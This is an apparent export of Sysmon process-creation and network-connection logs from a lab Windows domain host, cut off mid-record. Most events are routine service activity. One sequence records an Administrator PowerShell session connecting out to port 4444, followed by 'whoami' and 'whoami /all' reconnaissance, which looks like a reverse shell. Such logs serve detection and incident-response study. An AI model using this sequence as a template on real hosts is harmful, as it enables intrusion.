"May 28, 2026 @ 12:48:37.498"	"PxD8bZ4ByrYY_kgLbIbG"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:48:39.063"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:48:37.493
ProcessGuid: {6e4a868b-0f75-6a18-7c01-000000002300}
ProcessId: 8000
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0f75-6a18-7c01-000000002300}"	8000	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:48:37.493"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17374	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:48:35.094"	"PBD8bZ4ByrYY_kgLbIbG"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:48:37.062"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:48:35.092
ProcessGuid: {6e4a868b-0f73-6a18-7a01-000000002300}
ProcessId: 6568
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0f73-6a18-7a01-000000002300}"	6568	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:48:35.092"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17373	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:38:37.484"	"uBDzbZ4ByrYY_kgLRYRV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:38:38.711"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:38:37.478
ProcessGuid: {6e4a868b-0d1d-6a18-7501-000000002300}
ProcessId: 2180
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0d1d-6a18-7501-000000002300}"	2180	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:38:37.478"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17371	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:38:35.084"	"txDzbZ4ByrYY_kgLRYRV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:38:36.709"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:38:35.082
ProcessGuid: {6e4a868b-0d1b-6a18-7301-000000002300}
ProcessId: 1532
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0d1b-6a18-7301-000000002300}"	1532	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:38:35.082"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17370	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:37:42.715"	"UBDybZ4ByrYY_kgLgYTJ"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:37:44.677"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:37:42.708
ProcessGuid: {6e4a868b-0ce6-6a18-7101-000000002300}
ProcessId: 3832
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" /d acproxy.dll,PerformAutochkOperations
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\rundll32.exe"" /d acproxy.dll,PerformAutochkOperations"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows host process (Rundll32)"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1697 (WinBuild.160101.0800)"	" - "	"MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A"	"C:\Windows\System32\rundll32.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"RUNDLL32.EXE"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0ce6-6a18-7101-000000002300}"	3832	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:37:42.708"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17369	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:33:50.973"	"BRDvbZ4ByrYY_kgLB4Tn"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:33:52.550"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:33:50.967
ProcessGuid: {6e4a868b-0bfe-6a18-6e01-000000002300}
ProcessId: 832
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {6e4a868b-015f-6a18-9c00-000000002300}
ParentProcessId: 6340
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: ""C:\Windows\Explorer.EXE"" /NOUACCHECK
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"Microsoft Corporation"	"C:\Users\Administrator\"	"Windows PowerShell"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F"	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"PowerShell.EXE"	"""C:\Windows\Explorer.EXE"" /NOUACCHECK"	"C:\Windows\explorer.exe"	"{6e4a868b-015f-6a18-9c00-000000002300}"	6340	"LAB2019\Administrator"	"{6e4a868b-0bfe-6a18-6e01-000000002300}"	832	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:33:50.967"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17367	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:33:26.651"	"oRDubZ4ByrYY_kgLqoMc"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:33:28.535"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:33:26.647
ProcessGuid: {6e4a868b-0be6-6a18-6d01-000000002300}
ProcessId: 1492
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe"" /all
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ParentProcessId: 1192
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\whoami.exe"" /all"	"Microsoft Corporation"	"C:\Users\Administrator\"	"whoami - displays logged on user information"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88"	"C:\Windows\System32\whoami.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"whoami.exe"	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	"LAB2019\Administrator"	"{6e4a868b-0be6-6a18-6d01-000000002300}"	1492	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:33:26.647"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17366	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:33:20.231"	"mBDubZ4ByrYY_kgLb4N5"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:33:21.531"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:33:20.223
ProcessGuid: {6e4a868b-0be0-6a18-6c01-000000002300}
ProcessId: 4232
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ParentProcessId: 1192
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\whoami.exe"""	"Microsoft Corporation"	"C:\Users\Administrator\"	"whoami - displays logged on user information"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88"	"C:\Windows\System32\whoami.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"whoami.exe"	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	"LAB2019\Administrator"	"{6e4a868b-0be0-6a18-6c01-000000002300}"	4232	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:33:20.223"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17365	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:33:12.044"	"lhDubZ4ByrYY_kgLb4N5"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Network connection detected (rule: NetworkConnect)"	3	"May 28, 2026 @ 12:33:13.526"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Network connection detected:
RuleName: -
UtcTime: 2026-05-28 09:33:09.827
ProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ProcessId: 1192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: LAB2019\Administrator
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.251
SourceHostname: WIN-JOCP945SK51.lab2019.local
SourcePort: 50162
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.1.218
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	"'-"	"192.168.1.218"	false	4444	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	true	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	" - "	tcp	" - "	" - "	" - "	"'-"	"WIN-JOCP945SK51.lab2019.local"	"192.168.1.251"	false	50162	"'-"	" - "	"LAB2019\Administrator"	"2026-05-28 09:33:09.827"	" - "	" - "	3	" - "	Info	"3,216"	"4,112"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17364	"Network connection detected (rule: NetworkConnect)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:28:37.525"	"ShDqbZ4ByrYY_kgLN4MS"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:28:39.370"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:28:37.520
ProcessGuid: {6e4a868b-0ac5-6a18-6b01-000000002300}
ProcessId: 3996
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
